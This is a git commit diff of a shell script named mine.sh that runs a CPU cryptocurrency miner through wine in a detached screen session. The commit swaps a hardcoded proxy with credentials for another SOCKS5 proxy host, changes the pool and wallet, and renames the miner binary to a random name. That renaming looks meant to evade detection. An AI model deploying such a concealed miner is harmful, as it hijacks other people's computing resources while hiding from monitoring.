06b78f85c0e6f9a1d397c88dae4f308e81c71f2a
cvayoyo <145971481+Cvayoyo@users.noreply.github.com>
2026-02-04 12:04:28 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,8 +1,6 @@
-chmod +x *
-cd ccminer_CPU_3.8.3
-proxy=("161.77.32.244:44445:14a1f09e99339:f6387140b2")
-selected_proxy=${proxy[$RANDOM % ${#proxy[@]}]}
-ip_port=$(echo $selected_proxy | cut -d':' -f1-2)  # Menangkap ip:port
-username_password=$(echo $selected_proxy | cut -d':' -f3-4)  # Menangkap username:password
-proxy_url="socks5://$username_password@$ip_port"
-screen -d -m bash -c "wine ccminer.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.tetes_new_2 -p d=16384S -t 4 --proxy=$proxy_url"
+chmod +x * 
+cd ccminer_CPU_3.8.3 
+proxy_url="socks5://ayoyojuhnk.biz.id:6201"
+random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
+mv ccminer.exe $random_name.exe 
+screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://cn.vipor.net:5040 -u RDQPSMAnzdGH2tD9J8xiqWeya89n5zBPtu.yoah2 -p d=5 -t 4 --proxy=$proxy_url"
